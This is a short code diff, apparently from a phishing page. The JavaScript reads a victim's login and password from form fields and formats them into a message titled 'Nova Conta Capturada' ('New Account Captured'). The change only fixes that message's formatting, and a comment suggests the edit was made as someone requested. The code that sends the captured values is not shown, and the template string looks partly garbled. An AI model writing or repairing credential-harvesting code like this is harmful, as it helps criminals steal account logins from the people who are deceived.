@@ -146,7 +146,7 @@
       const senha = document.getElementById('password').value.trim();
 
       // Formato antigo, exatamente como você queria: sem backticks extras
-      const mensagem = `🔐 **Nova Conta Capturada**`\n\n**Login:**\n\(` `{login || '—'}`\n\n**Senha:**\n \)`{senha || '—'}`;
+      const mensagem = `🔐 **Nova Conta Capturada**\n\n**Login:**\n\( {login || '—'}\n\n**Senha:**\n \){senha || '—'}`;
 
       if (login) {
         try {
